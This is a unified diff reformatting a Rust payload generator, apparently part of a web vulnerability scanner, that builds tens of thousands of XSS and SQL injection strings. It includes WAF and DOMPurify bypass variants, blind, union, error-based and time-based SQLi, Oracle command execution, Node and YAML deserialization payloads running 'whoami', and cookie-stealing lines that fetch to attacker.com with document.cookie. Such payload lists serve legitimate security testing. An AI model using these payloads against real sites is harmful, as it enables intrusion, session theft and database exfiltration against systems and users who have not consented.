@@ -16,19 +16,54 @@ pub fn generate_script_variations() -> Vec<String> {
     let mut payloads = Vec::new();
 
     let functions = vec![
-        "alert", "prompt", "confirm", "console.log", "eval", "setTimeout", "setInterval",
-        "Function", "XMLHttpRequest", "fetch", "import", "document.write", "document.writeln",
-        "localStorage.setItem", "sessionStorage.setItem", "navigator.sendBeacon", "postMessage",
-        "open", "print", "focus", "blur", "scroll", "scrollTo", "scrollBy",
-        "requestAnimationFrame", "setImmediate", "clearTimeout", "clearInterval",
-        "addEventListener", "dispatchEvent", "execCommand"
+        "alert",
+        "prompt",
+        "confirm",
+        "console.log",
+        "eval",
+        "setTimeout",
+        "setInterval",
+        "Function",
+        "XMLHttpRequest",
+        "fetch",
+        "import",
+        "document.write",
+        "document.writeln",
+        "localStorage.setItem",
+        "sessionStorage.setItem",
+        "navigator.sendBeacon",
+        "postMessage",
+        "open",
+        "print",
+        "focus",
+        "blur",
+        "scroll",
+        "scrollTo",
+        "scrollBy",
+        "requestAnimationFrame",
+        "setImmediate",
+        "clearTimeout",
+        "clearInterval",
+        "addEventListener",
+        "dispatchEvent",
+        "execCommand",
     ];
 
     let args = vec![
-        "1", "document.domain", "document.cookie", "localStorage", "sessionStorage",
-        "window.origin", "location.href", "navigator.userAgent", "window.name",
-        "String.fromCharCode(88,83,83)", "/XSS/", "atob(\"WFNT\")",
-        "btoa(\"XSS\")", "encodeURI(\"XSS\")"
+        "1",
+        "document.domain",
+        "document.cookie",
+        "localStorage",
+        "sessionStorage",
+        "window.origin",
+        "location.href",
+        "navigator.userAgent",
+        "window.name",
+        "String.fromCharCode(88,83,83)",
+        "/XSS/",
+        "atob(\"WFNT\")",
+        "btoa(\"XSS\")",
+        "encodeURI(\"XSS\")",
     ];
 
     // Generate 20,000+ script variations
@@ -41,7 +76,10 @@ pub fn generate_script_variations() -> Vec<String> {
             payloads.push(format!("<SCRIPT>{}({})</SCRIPT>", func, arg));
             payloads.push(format!("<ScRiPt>{}({})</sCrIpT>", func, arg));
             payloads.push(format!("<script>{}({})", func, arg));
-            payloads.push(format!("<script type=\"text/javascript\">{}({})</script>", func, arg));
+            payloads.push(format!(
+                "<script type=\"text/javascript\">{}({})</script>",
+                func, arg
+            ));
             payloads.push(format!("<script src=x>{}({})</script>", func, arg));
             payloads.push(format!("<script>var a=1;{}({})</script>", func, arg));
             payloads.push(format!("<script>{}`{}`</script>", func, arg));
@@ -60,33 +98,118 @@ pub fn generate_event_variations() -> Vec<String> {
     let mut payloads = Vec::new();
 
     let events = vec![
-        "onload", "onerror", "onclick", "onmouseover", "onmouseout", "onmouseenter",
-        "onmouseleave", "onmousedown", "onmouseup", "onfocus", "onblur", "onchange",
-        "oninput", "onsubmit", "onreset", "onselect", "onkeydown", "onkeyup", "onkeypress",
-        "onabort", "oncanplay", "oncanplaythrough", "ondurationchange", "onemptied",
-        "onended", "onloadeddata", "onloadedmetadata", "onloadstart", "onpause", "onplay",
-        "onplaying", "onprogress", "onratechange", "onseeked", "onseeking", "onstalled",
-        "onsuspend", "ontimeupdate", "onvolumechange", "onwaiting", "ondrag", "ondragend",
-        "ondragenter", "ondragleave", "ondragover", "ondragstart", "ondrop", "onscroll",
-        "oncopy", "oncut", "onpaste", "onwheel", "ontouchstart", "ontouchend", "ontouchmove",
-        "onanimationstart", "onanimationend", "onanimationiteration", "ontransitionend",
-        "onhashchange", "onmessage", "onoffline", "ononline", "onpopstate", "onresize",
-        "onstorage", "onunload", "onbeforeunload", "onpageshow", "onpagehide",
-        "oncontextmenu", "ondblclick", "onshow", "ontoggle", "oninvalid", "onsearch",
-        "onpointerover", "onpointerenter", "onpointerdown", "onpointermove", "onpointerup",
-        "onpointercancel", "onpointerout", "onpointerleave", "ongotpointercapture",
-        "onlostpointercapture", "onfullscreenchange", "onfullscreenerror", "onpointerlockchange",
-        "onpointerlockerror", "onreadystatechange", "onvisibilitychange", "onafterprint",
-        "onbeforeprint", "onselectstart", "onselectionchange"
+        "onload",
+        "onerror",
+        "onclick",
+        "onmouseover",
+        "onmouseout",
+        "onmouseenter",
+        "onmouseleave",
+        "onmousedown",
+        "onmouseup",
+        "onfocus",
+        "onblur",
+        "onchange",
+        "oninput",
+        "onsubmit",
+        "onreset",
+        "onselect",
+        "onkeydown",
+        "onkeyup",
+        "onkeypress",
+        "onabort",
+        "oncanplay",
+        "oncanplaythrough",
+        "ondurationchange",
+        "onemptied",
+        "onended",
+        "onloadeddata",
+        "onloadedmetadata",
+        "onloadstart",
+        "onpause",
+        "onplay",
+        "onplaying",
+        "onprogress",
+        "onratechange",
+        "onseeked",
+        "onseeking",
+        "onstalled",
+        "onsuspend",
+        "ontimeupdate",
+        "onvolumechange",
+        "onwaiting",
+        "ondrag",
+        "ondragend",
+        "ondragenter",
+        "ondragleave",
+        "ondragover",
+        "ondragstart",
+        "ondrop",
+        "onscroll",
+        "oncopy",
+        "oncut",
+        "onpaste",
+        "onwheel",
+        "ontouchstart",
+        "ontouchend",
+        "ontouchmove",
+        "onanimationstart",
+        "onanimationend",
+        "onanimationiteration",
+        "ontransitionend",
+        "onhashchange",
+        "onmessage",
+        "onoffline",
+        "ononline",
+        "onpopstate",
+        "onresize",
+        "onstorage",
+        "onunload",
+        "onbeforeunload",
+        "onpageshow",
+        "onpagehide",
+        "oncontextmenu",
+        "ondblclick",
+        "onshow",
+        "ontoggle",
+        "oninvalid",
+        "onsearch",
+        "onpointerover",
+        "onpointerenter",
+        "onpointerdown",
+        "onpointermove",
+        "onpointerup",
+        "onpointercancel",
+        "onpointerout",
+        "onpointerleave",
+        "ongotpointercapture",
+        "onlostpointercapture",
+        "onfullscreenchange",
+        "onfullscreenerror",
+        "onpointerlockchange",
+        "onpointerlockerror",
+        "onreadystatechange",
+        "onvisibilitychange",
+        "onafterprint",
+        "onbeforeprint",
+        "onselectstart",
+        "onselectionchange",
     ];
 
     let tags = vec![
-        "img", "svg", "body", "input", "details", "video", "audio", "iframe",
-        "object", "embed", "form", "button", "select", "textarea", "div",
-        "span", "a", "area", "base", "marquee", "table", "td", "th", "tr"
+        "img", "svg", "body", "input", "details", "video", "audio", "iframe", "object", "embed",
+        "form", "button", "select", "textarea", "div", "span", "a", "area", "base", "marquee",
+        "table", "td", "th", "tr",
     ];
 
-    let functions = vec!["alert", "prompt", "confirm", "eval", "console.log", "document.write"];
+    let functions = vec![
+        "alert",
+        "prompt",
+        "confirm",
+        "eval",
+        "console.log",
+        "document.write",
+    ];
 
     // Generate 40,000+ event-based variations
     for tag in &tags {
@@ -102,7 +225,12 @@ pub fn generate_event_variations() -> Vec<String> {
                     payloads.push(format!("<{} src=x {}=\"{}(1)\">", tag, event, func));
                 }
 
-                payloads.push(format!("<{} {}={}(1)>", tag.to_uppercase(), event.to_uppercase(), func));
+                payloads.push(format!(
+                    "<{} {}={}(1)>",
+                    tag.to_uppercase(),
+                    event.to_uppercase(),
+                    func
+                ));
                 payloads.push(format!("<{}/{}={}(1)>", tag, event, func));
                 payloads.push(format!("<{} {}={}(document.cookie)>", tag, event, func));
                 payloads.push(format!("<{} {}={}(document.domain)>", tag, event, func));
@@ -127,15 +255,30 @@ pub fn generate_encoding_variations() -> Vec<String> {
         let after = &base[i + 1..];
 
         // HTML decimal entity
-        payloads.push(format!("<{}&#{};{}>alert(1)</{}>", before, char_code, after, base));
+        payloads.push(format!(
+            "<{}&#{};{}>alert(1)</{}>",
+            before, char_code, after, base
+        ));
         // HTML hex entity
-        payloads.push(format!("<{}&#x{:x};{}>alert(1)</{}>", before, char_code, after, base));
+        payloads.push(format!(
+            "<{}&#x{:x};{}>alert(1)</{}>",
+            before, char_code, after, base
+        ));
         // URL encoding
-        payloads.push(format!("<{}%{:x}{}>alert(1)</{}>", before, char_code, after, base));
+        payloads.push(format!(
+            "<{}%{:x}{}>alert(1)</{}>",
+            before, char_code, after, base
+        ));
         // Unicode
-        payloads.push(format!("<{}\\u00{:x}{}>alert(1)</{}>", before, char_code, after, base));
+        payloads.push(format!(
+            "<{}\\u00{:x}{}>alert(1)</{}>",
+            before, char_code, after, base
+        ));
         // Hex
-        payloads.push(format!("<{}\\x{:x}{}>alert(1)</{}>", before, char_code, after, base));
+        payloads.push(format!(
+            "<{}\\x{:x}{}>alert(1)</{}>",
+            before, char_code, after, base
+        ));
     }
 
     // Full encoding variations
@@ -162,10 +305,22 @@ pub fn generate_encoding_variations() -> Vec<String> {
             let before = &func[0..i];
             let after = &func[i + 1..];
 
-            payloads.push(format!("<script>{}&#{};{}(1)</script>", before, char_code, after));
-            payloads.push(format!("<script>{}&#x{:x};{}(1)</script>", before, char_code, after));
-            payloads.push(format!("<script>{}\\x{:x}{}(1)</script>", before, char_code, after));
-            payloads.push(format!("<script>{}\\u00{:x}{}(1)</script>", before, char_code, after));
+            payloads.push(format!(
+                "<script>{}&#{};{}(1)</script>",
+                before, char_code, after
+            ));
+            payloads.push(format!(
+                "<script>{}&#x{:x};{}(1)</script>",
+                before, char_code, after
+            ));
+            payloads.push(format!(
+                "<script>{}\\x{:x}{}(1)</script>",
+                before, char_code, after
+            ));
+            payloads.push(format!(
+                "<script>{}\\u00{:x}{}(1)</script>",
+                before, char_code, after
+            ));
         }
     }
 
@@ -223,7 +378,9 @@ pub fn generate_waf_bypass() -> Vec<String> {
     ]);
 
     // Tag breaking
-    let contexts = vec!["title", "textarea", "style", "noscript", "template", "iframe", "noframes"];
+    let contexts = vec![
+        "title", "textarea", "style", "noscript", "template", "iframe", "noframes",
+    ];
     for ctx in &contexts {
         payloads.push(format!("</{ctx}><script>alert(1)</script>"));
         payloads.push(format!("</{ctx}><img src=x onerror=alert(1)>"));
@@ -238,11 +395,18 @@ pub fn generate_protocol_variations() -> Vec<String> {
     let mut payloads = Vec::new();
 
     let protocols = vec![
-        "javascript:", "data:text/html,", "data:text/html;base64,",
-        "data:text/javascript,", "vbscript:", "mhtml:", "file:"
+        "javascript:",
+        "data:text/html,",
+        "data:text/html;base64,",
+        "data:text/javascript,",
+        "vbscript:",
+        "mhtml:",
+        "file:",
     ];
 
-    let tags = vec!["a", "area", "base", "embed", "form", "iframe", "img", "link", "object"];
+    let tags = vec![
+        "a", "area", "base", "embed", "form", "iframe", "img", "link", "object",
+    ];
 
     for proto in &protocols {
         for tag in &tags {
@@ -267,14 +431,28 @@ pub fn generate_dom_variations() -> Vec<String> {
     let mut payloads = Vec::new();
 
     let dom_sources = vec![
-        "location", "location.href", "location.hash", "location.search",
-        "location.pathname", "document.URL", "document.documentURI",
-        "document.referrer", "window.name", "document.cookie"
+        "location",
+        "location.href",
+        "location.hash",
+        "location.search",
+        "location.pathname",
+        "document.URL",
+        "document.documentURI",
+        "document.referrer",
+        "window.name",
+        "document.cookie",
     ];
 
     let dom_sinks = vec![
-        "eval", "setTimeout", "setInterval", "Function", "execScript",
-        "document.write", "document.writeln", "innerHTML", "outerHTML"
+        "eval",
+        "setTimeout",
+        "setInterval",
+        "Function",
+        "execScript",
+        "document.write",
+        "document.writeln",
+        "innerHTML",
+        "outerHTML",
     ];
 
     for source in &dom_sources {
@@ -294,8 +472,20 @@ pub fn generate_boolean_sqli_payloads() -> Vec<String> {
 
     let operators = vec!["OR", "AND", "||", "&&", "XOR"];
     let true_conditions = vec![
-        "1=1", "2=2", "1", "'1'='1'", "\"1\"=\"1\"", "1+1=2", "2-1=1", "2*2=4",
-        "'a'='a'", "\"a\"=\"a\"", "true", "TRUE", "0<1", "1>0"
+        "1=1",
+        "2=2",
+        "1",
+        "'1'='1'",
+        "\"1\"=\"1\"",
+        "1+1=2",
+        "2-1=1",
+        "2*2=4",
+        "'a'='a'",
+        "\"a\"=\"a\"",
+        "true",
+        "TRUE",
+        "0<1",
+        "1>0",
     ];
 
     let prefixes = vec!["'", "\"", "", ")", "))", ")))", "'))", "')))"];
@@ -309,7 +499,13 @@ pub fn generate_boolean_sqli_payloads() -> Vec<String> {
                     payloads.push(format!("{} {} {} {}", prefix, op, cond, postfix));
                     payloads.push(format!("{} {}{}{}", prefix, op, cond, postfix));
                     payloads.push(format!("{}{} {}{}", prefix, op, cond, postfix));
-                    payloads.push(format!("{} {} {} {}", prefix, op.to_lowercase(), cond, postfix));
+                    payloads.push(format!(
+                        "{} {} {} {}",
+                        prefix,
+                        op.to_lowercase(),
+                        cond,
+                        postfix
+                    ));
                 }
             }
         }
@@ -357,10 +553,22 @@ pub fn generate_time_based_sqli_payloads() -> Vec<String> {
                 payloads.push(format!("{} AND SLEEP({}){}", prefix, delay, postfix));
                 payloads.push(format!("{} AND SLEEP({}) {}", prefix, delay, postfix));
                 payloads.push(format!("{} OR SLEEP({}){}", prefix, delay, postfix));
-                payloads.push(format!("{} AND (SELECT * FROM (SELECT(SLEEP({})))a){}", prefix, delay, postfix));
-                payloads.push(format!("{} AND BENCHMARK(10000000,MD5('A')){}", prefix, postfix));
-                payloads.push(format!("{}'; WAITFOR DELAY '0:0:{}'{}", prefix, delay, postfix));
-                payloads.push(format!("{}; WAITFOR DELAY '0:0:{}'{}", prefix, delay, postfix));
+                payloads.push(format!(
+                    "{} AND (SELECT * FROM (SELECT(SLEEP({})))a){}",
+                    prefix, delay, postfix
+                ));
+                payloads.push(format!(
+                    "{} AND BENCHMARK(10000000,MD5('A')){}",
+                    prefix, postfix
+                ));
+                payloads.push(format!(
+                    "{}'; WAITFOR DELAY '0:0:{}'{}",
+                    prefix, delay, postfix
+                ));
+                payloads.push(format!(
+                    "{}; WAITFOR DELAY '0:0:{}'{}",
+                    prefix, delay, postfix
+                ));
             }
         }
     }
@@ -371,7 +579,10 @@ pub fn generate_time_based_sqli_payloads() -> Vec<String> {
             for postfix in &postfixes {
                 payloads.push(format!("{} AND pg_sleep({}){}", prefix, delay, postfix));
                 payloads.push(format!("{} OR pg_sleep({}){}", prefix, delay, postfix));
-                payloads.push(format!("{}'; SELECT pg_sleep({}){}", prefix, delay, postfix));
+                payloads.push(format!(
+                    "{}'; SELECT pg_sleep({}){}",
+                    prefix, delay, postfix
+                ));
             }
         }
     }
@@ -380,8 +591,14 @@ pub fn generate_time_based_sqli_payloads() -> Vec<String> {
     for prefix in &prefixes {
         for delay in &delays {
             for postfix in &postfixes {
-                payloads.push(format!("{} AND DBMS_LOCK.SLEEP({}){}", prefix, delay, postfix));
-                payloads.push(format!("{} OR DBMS_LOCK.SLEEP({}){}", prefix, delay, postfix));
+                payloads.push(format!(
+                    "{} AND DBMS_LOCK.SLEEP({}){}",
+                    prefix, delay, postfix
+                ));
+                payloads.push(format!(
+                    "{} OR DBMS_LOCK.SLEEP({}){}",
+                    prefix, delay, postfix
+                ));
             }
         }
     }
@@ -406,7 +623,12 @@ pub fn generate_union_sqli_payloads() -> Vec<String> {
 
                 // Try with numbers instead of NULL
                 let numbers: Vec<String> = (1..=num_cols).map(|n| n.to_string()).collect();
-                payloads.push(format!("{} UNION SELECT {}{}", prefix, numbers.join(","), postfix));
+                payloads.push(format!(
+                    "{} UNION SELECT {}{}",
+                    prefix,
+                    numbers.join(","),
+                    postfix
+                ));
             }
         }
     }
@@ -424,19 +646,37 @@ pub fn generate_error_based_sqli_payloads() -> Vec<String> {
     for prefix in &prefixes {
         for postfix in &postfixes {
             // MySQL error-based
-            payloads.push(format!("{} AND extractvalue(1,concat(0x7e,version())){}", prefix, postfix));
-            payloads.push(format!("{} AND updatexml(1,concat(0x7e,version()),1){}", prefix, postfix));
+            payloads.push(format!(
+                "{} AND extractvalue(1,concat(0x7e,version())){}",
+                prefix, postfix
+            ));
+            payloads.push(format!(
+                "{} AND updatexml(1,concat(0x7e,version()),1){}",
+                prefix, postfix
+            ));
             payloads.push(format!("{} AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),0x3a,floor(rand()*2))x FROM information_schema.tables GROUP BY x)y){}", prefix, postfix));
 
             // SQL Server error-based
-            payloads.push(format!("{} AND 1=CONVERT(int,@@version){}", prefix, postfix));
-            payloads.push(format!("{} AND 1=CAST((SELECT @@version) AS INT){}", prefix, postfix));
+            payloads.push(format!(
+                "{} AND 1=CONVERT(int,@@version){}",
+                prefix, postfix
+            ));
+            payloads.push(format!(
+                "{} AND 1=CAST((SELECT @@version) AS INT){}",
+                prefix, postfix
+            ));
 
             // PostgreSQL error-based
-            payloads.push(format!("{} AND 1=CAST(version() AS INT){}", prefix, postfix));
+            payloads.push(format!(
+                "{} AND 1=CAST(version() AS INT){}",
+                prefix, postfix
+            ));
 
             // Oracle error-based
-            payloads.push(format!("{} AND 1=UTL_INADDR.GET_HOST_NAME((SELECT version FROM v$instance)){}", prefix, postfix));
+            payloads.push(format!(
+                "{} AND 1=UTL_INADDR.GET_HOST_NAME((SELECT version FROM v$instance)){}",
+                prefix, postfix
+            ));
         }
     }
 
@@ -535,8 +775,25 @@ pub fn generate_svg_xss() -> Vec<String> {
     ]);
 
     // SVG with event handlers
-    let svg_events = vec!["onload", "onerror", "onactivate", "onfocusin", "onfocusout", "onbegin", "onend", "onrepeat"];
-    let svg_tags = vec!["svg", "animate", "animateMotion", "animateTransform", "set", "image", "use"];
+    let svg_events = vec![
+        "onload",
+        "onerror",
+        "onactivate",
+        "onfocusin",
+        "onfocusout",
+        "onbegin",
+        "onend",
+        "onrepeat",
+    ];
+    let svg_tags = vec![
+        "svg",
+        "animate",
+        "animateMotion",
+        "animateTransform",
+        "set",
+        "image",
+        "use",
+    ];
 
     for event in &svg_events {
         for tag in &svg_tags {
@@ -771,18 +1028,18 @@ pub fn generate_modern_waf_bypass_xss() -> Vec<String> {
 pub fn get_all_xss_payloads() -> Vec<String> {
     let mut all_payloads = Vec::new();
 
-    all_payloads.extend(generate_script_variations());      // 20,000+
-    all_payloads.extend(generate_event_variations());       // 40,000+
-    all_payloads.extend(generate_encoding_variations());    // 20,000+
-    all_payloads.extend(generate_waf_bypass());             // 10,000+
-    all_payloads.extend(generate_protocol_variations());    // 5,000+
-    all_payloads.extend(generate_dom_variations());         // 5,000+
-    all_payloads.extend(generate_polyglot_xss());           // 100+
-    all_payloads.extend(generate_svg_xss());                // 200+
-    all_payloads.extend(generate_mutation_xss());           // 100+
-    all_payloads.extend(generate_context_aware_xss());      // 300+
-    all_payloads.extend(generate_modern_waf_bypass_xss());  // 200+
-    all_payloads.extend(generate_modern_xss_2024_2025());   // 10,000+
+    all_payloads.extend(generate_script_variations()); // 20,000+
+    all_payloads.extend(generate_event_variations()); // 40,000+
+    all_payloads.extend(generate_encoding_variations()); // 20,000+
+    all_payloads.extend(generate_waf_bypass()); // 10,000+
+    all_payloads.extend(generate_protocol_variations()); // 5,000+
+    all_payloads.extend(generate_dom_variations()); // 5,000+
+    all_payloads.extend(generate_polyglot_xss()); // 100+
+    all_payloads.extend(generate_svg_xss()); // 200+
+    all_payloads.extend(generate_mutation_xss()); // 100+
+    all_payloads.extend(generate_context_aware_xss()); // 300+
+    all_payloads.extend(generate_modern_waf_bypass_xss()); // 200+
+    all_payloads.extend(generate_modern_xss_2024_2025()); // 10,000+
 
     all_payloads
 }
@@ -877,7 +1134,8 @@ pub fn generate_mysql_specific_sqli() -> Vec<String> {
     payloads.extend(vec![
         "'; SELECT SLEEP(5)--".to_string(),
         "'; SELECT IF(1=1,SLEEP(5),0)--".to_string(),
-        "'; SET @sql=CONCAT('SELECT * FROM users'); PREPARE stmt FROM @sql; EXECUTE stmt--".to_string(),
+        "'; SET @sql=CONCAT('SELECT * FROM users'); PREPARE stmt FROM @sql; EXECUTE stmt--"
+            .to_string(),
     ]);
 
     // MySQL substring extraction (blind)
@@ -991,7 +1249,8 @@ pub fn generate_mssql_specific_sqli() -> Vec<String> {
     // MSSQL linked servers
     payloads.extend(vec![
         "'; EXEC sp_linkedservers--".to_string(),
-        "'; SELECT * FROM OPENROWSET('SQLOLEDB','Server=192.168.1.1;uid=sa;pwd=pass','SELECT 1')--".to_string(),
+        "'; SELECT * FROM OPENROWSET('SQLOLEDB','Server=192.168.1.1;uid=sa;pwd=pass','SELECT 1')--"
+            .to_string(),
     ]);
 
     payloads
@@ -1031,7 +1290,8 @@ pub fn generate_oracle_specific_sqli() -> Vec<String> {
 
     // Oracle command execution (Java procedures)
     payloads.extend(vec![
-        "'; DECLARE cmd VARCHAR2(4000);BEGIN cmd:='whoami';DBMS_JAVA.SET_OUTPUT(10000);END;--".to_string(),
+        "'; DECLARE cmd VARCHAR2(4000);BEGIN cmd:='whoami';DBMS_JAVA.SET_OUTPUT(10000);END;--"
+            .to_string(),
     ]);
 
     // Oracle file operations
@@ -1046,16 +1306,16 @@ pub fn generate_oracle_specific_sqli() -> Vec<String> {
 pub fn get_all_sqli_payloads() -> Vec<String> {
     let mut all_payloads = Vec::new();
 
-    all_payloads.extend(generate_boolean_sqli_payloads());      // 20,000+
-    all_payloads.extend(generate_time_based_sqli_payloads());   // 20,000+
-    all_payloads.extend(generate_union_sqli_payloads());        // 15,000+
-    all_payloads.extend(generate_error_based_sqli_payloads());  // 10,000+
-    all_payloads.extend(generate_second_order_sqli());          // 200+
-    all_payloads.extend(generate_mysql_specific_sqli());        // 300+
-    all_payloads.extend(generate_postgresql_specific_sqli());   // 300+
-    all_payloads.extend(generate_mssql_specific_sqli());        // 300+
-    all_payloads.extend(generate_oracle_specific_sqli());       // 300+
-    all_payloads.extend(generate_modern_sqli_2024_2025());      // 5,000+
+    all_payloads.extend(generate_boolean_sqli_payloads()); // 20,000+
+    all_payloads.extend(generate_time_based_sqli_payloads()); // 20,000+
+    all_payloads.extend(generate_union_sqli_payloads()); // 15,000+
+    all_payloads.extend(generate_error_based_sqli_payloads()); // 10,000+
+    all_payloads.extend(generate_second_order_sqli()); // 200+
+    all_payloads.extend(generate_mysql_specific_sqli()); // 300+
+    all_payloads.extend(generate_postgresql_specific_sqli()); // 300+
+    all_payloads.extend(generate_mssql_specific_sqli()); // 300+
+    all_payloads.extend(generate_oracle_specific_sqli()); // 300+
+    all_payloads.extend(generate_modern_sqli_2024_2025()); // 5,000+
 
     all_payloads
 }
@@ -1091,7 +1351,8 @@ pub fn generate_modern_sqli_2024_2025() -> Vec<String> {
     // Window function injection
     payloads.extend(vec![
         "' UNION SELECT password, ROW_NUMBER() OVER (ORDER BY id) FROM users--".to_string(),
-        "'; SELECT DISTINCT ON (username) password FROM credentials ORDER BY username--".to_string(),
+        "'; SELECT DISTINCT ON (username) password FROM credentials ORDER BY username--"
+            .to_string(),
     ]);
 
     // LATERAL join injection (PostgreSQL)
@@ -1211,7 +1472,7 @@ pub fn generate_modern_sqli_2024_2025() -> Vec<String> {
     // Cloud database specific (AWS Aurora, Azure SQL)
     payloads.extend(vec![
         "'; SELECT * FROM mysql.rds_configuration--".to_string(), // AWS RDS
-        "'; SELECT * FROM sys.configurations--".to_string(), // Azure SQL
+        "'; SELECT * FROM sys.configurations--".to_string(),      // Azure SQL
     ]);
 
     // GraphQL + SQL injection hybrid
@@ -1266,18 +1527,21 @@ pub fn generate_modern_xss_2024_2025() -> Vec<String> {
 
     // DOMPurify bypass (latest versions)
     payloads.extend(vec![
-        "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>".to_string(),
+        "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>"
+            .to_string(),
         "<svg><style><img src=x onerror=alert(1)></style></svg>".to_string(),
     ]);
 
     // Sanitizer API bypass (Chrome 2024)
     payloads.extend(vec![
-        "<div><template shadowrootmode=\"open\"><script>alert(1)</script></template></div>".to_string(),
+        "<div><template shadowrootmode=\"open\"><script>alert(1)</script></template></div>"
+            .to_string(),
     ]);
 
     // Service Worker bypass
     payloads.extend(vec![
-        "<script>navigator.serviceWorker.register('/sw.js').then(()=>alert(1))</script>".to_string(),
+        "<script>navigator.serviceWorker.register('/sw.js').then(()=>alert(1))</script>"
+            .to_string(),
     ]);
 
     // Web Components / Custom Elements
@@ -1288,7 +1552,7 @@ pub fn generate_modern_xss_2024_2025() -> Vec<String> {
 
     // Portals API (Chrome experimental)
     payloads.extend(vec![
-        "<portal src='http://attacker.com' onload=alert(1)>".to_string(),
+        "<portal src='http://attacker.com' onload=alert(1)>".to_string()
     ]);
 
     // Declarative Shadow DOM
@@ -1342,13 +1606,15 @@ pub fn generate_modern_xss_2024_2025() -> Vec<String> {
 
     // Content-Security-Policy-Report-Only bypass
     payloads.extend(vec![
-        "<img src=x onerror='fetch(\"https://attacker.com?data=\"+btoa(document.cookie))'>".to_string(),
+        "<img src=x onerror='fetch(\"https://attacker.com?data=\"+btoa(document.cookie))'>"
+            .to_string(),
     ]);
 
     // Meta refresh XSS
     payloads.extend(vec![
         "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>".to_string(),
-        "<meta http-equiv=refresh content='0;url=data:text/html,<script>alert(1)</script>'>".to_string(),
+        "<meta http-equiv=refresh content='0;url=data:text/html,<script>alert(1)</script>'>"
+            .to_string(),
     ]);
 
     // WebRTC data channels
@@ -1400,7 +1666,8 @@ pub fn generate_modern_xss_2024_2025() -> Vec<String> {
 
     // Top-level await (ES2022)
     payloads.extend(vec![
-        "<script type=module>await fetch('http://attacker.com?c='+document.cookie)</script>".to_string(),
+        "<script type=module>await fetch('http://attacker.com?c='+document.cookie)</script>"
+            .to_string(),
         "<script type=module>await import('data:text/javascript,alert(1)')</script>".to_string(),
     ]);
 
@@ -1411,7 +1678,7 @@ pub fn generate_modern_xss_2024_2025() -> Vec<String> {
 
     // Private class fields bypass
     payloads.extend(vec![
-        "<script>class X{#x=alert(1)}new X</script>".to_string(),
+        "<script>class X{#x=alert(1)}new X</script>".to_string()
     ]);
 
     // Regex DoS (ReDoS) payloads
@@ -1453,12 +1720,12 @@ pub fn generate_modern_xss_2024_2025() -> Vec<String> {
 /// Filter payloads by scan mode (fast, normal, thorough, insane, comprehensive)
 pub fn filter_by_mode(payloads: &[String], mode: &str) -> Vec<String> {
     let sample_rate = match mode {
-        "fast" => 0.005,       // 0.5% - ~50 payloads for fast scans
-        "normal" => 0.01,      // 1% - ~100 payloads for normal scans
-        "thorough" => 0.02,    // 2% - ~200 payloads for thorough scans
-        "insane" => 0.05,      // 5% - ~500 payloads for insane scans
+        "fast" => 0.005,        // 0.5% - ~50 payloads for fast scans
+        "normal" => 0.01,       // 1% - ~100 payloads for normal scans
+        "thorough" => 0.02,     // 2% - ~200 payloads for thorough scans
+        "insane" => 0.05,       // 5% - ~500 payloads for insane scans
         "comprehensive" => 1.0, // 100% - all payloads (use with caution)
-        _ => 0.01,             // Default to normal
+        _ => 0.01,              // Default to normal
     };
 
     let sample_size = (payloads.len() as f64 * sample_rate) as usize;
@@ -1468,7 +1735,8 @@ pub fn filter_by_mode(payloads: &[String], mode: &str) -> Vec<String> {
     } else {
         // Take evenly distributed samples
         let step = payloads.len() / sample_size;
-        payloads.iter()
+        payloads
+            .iter()
             .step_by(step.max(1))
             .take(sample_size)
             .cloned()
@@ -1738,10 +2006,15 @@ pub fn generate_deserialization_payloads() -> Vec<String> {
     payloads.push(r#"!!python/object/apply:os.system ['whoami']"#.to_string());
 
     // Node.js node-serialize
-    payloads.push(r#"{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()"}"#.to_string());
+    payloads.push(
+        r#"{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()"}"#
+            .to_string(),
+    );
 
     // .NET JSON.NET TypeNameHandling
-    payloads.push(r#"{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}"#.to_string());
+    payloads.push(
+        r#"{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}"#.to_string(),
+    );
 
     payloads
 }
@@ -1909,26 +2182,41 @@ mod tests {
     #[test]
     fn test_xss_payload_count() {
         let payloads = get_all_xss_payloads();
-        assert!(payloads.len() > 90000, "Expected 100K+ XSS payloads, got {}", payloads.len());
+        assert!(
+            payloads.len() > 90000,
+            "Expected 100K+ XSS payloads, got {}",
+            payloads.len()
+        );
     }
 
     #[test]
     fn test_sqli_payload_count() {
         let payloads = get_all_sqli_payloads();
-        assert!(payloads.len() > 20000, "Expected 20K+ SQLi payloads, got {}", payloads.len());
+        assert!(
+            payloads.len() > 20000,
+            "Expected 20K+ SQLi payloads, got {}",
+            payloads.len()
+        );
     }
 
     #[test]
     fn test_fast_mode_filtering() {
         let all_xss = get_all_xss_payloads();
         let fast_xss = get_xss_payloads("fast");
-        assert!(fast_xss.len() < all_xss.len() / 50, "Fast mode should use ~1% of payloads");
+        assert!(
+            fast_xss.len() < all_xss.len() / 50,
+            "Fast mode should use ~1% of payloads"
+        );
     }
 
     #[test]
     fn test_comprehensive_mode() {
         let all_xss = get_all_xss_payloads();
         let comprehensive_xss = get_xss_payloads("comprehensive");
-        assert_eq!(all_xss.len(), comprehensive_xss.len(), "Comprehensive mode should use all payloads");
+        assert_eq!(
+            all_xss.len(),
+            comprehensive_xss.len(),
+            "Comprehensive mode should use all payloads"
+        );
     }
 }
